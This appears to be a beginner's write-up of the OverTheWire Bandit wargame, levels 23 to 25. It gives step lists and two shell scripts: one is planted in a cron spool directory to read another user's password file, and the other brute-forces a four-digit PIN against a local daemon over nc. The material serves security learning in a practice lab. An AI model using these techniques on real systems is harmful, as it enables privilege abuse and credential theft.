@@ -1,0 +1,51 @@
+Level 23-24
+
+task:- A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+step3 - ls -la 
+step4 - ls /etc/cron.d/
+step5 - cat /etc/cron.d/cronjob_bandit24
+step6 - cat /usr/bin/cronjob_bandit24.sh
+step7 - mkdir /tmp/parth24
+step8 - cd /tmp/parth24
+step9 - nano bandit24_pass.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/parth24/password
+step10 - chmod 777 /tmp/parth24
+step11 - chmod 755 bandit24_pass/sh
+step12 - cp bandit24_pass.sh /var/spool/bandit24/foo
+step13 - sleep 60
+step 14 - cat password
+
+problem i faced :- there is ton of problem i faced permission for files are just hard for me as a begineer and i did a stupid for creating password file for convinence but it backfired quickly i just did not have the patienece so i used ai and it did confuse me further so my advice is just read blogs of people solving this
+ 
+
+Level 24-25
+
+
+task:- A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.You do not need to create new connections each time
+
+step3 - ls -la
+step4 - mkdir /tmp/parth25
+step5 - cd /tmp/parth25
+step6 - nano brute.sh
+#!/bin/bash
+pass=$(cat /etc/bandit_pass/bandit24)
+
+for pin in $(seq -w 0000 9999); do
+    echo "$pass $pin"
+done | nc localhost 30002
+step7 - chmod +x brute.sh
+step8 - ./brute.sh
+
+problem i faced :- the script [seq -w 0000 9999 → generates all PINs with leading zeros.
+
+The loop prints password PIN for each.
+
+The entire stream is piped into one single nc connection.
+
+The daemon processes each line in order until the correct PIN is found, then it prints the bandit25 password] explanation
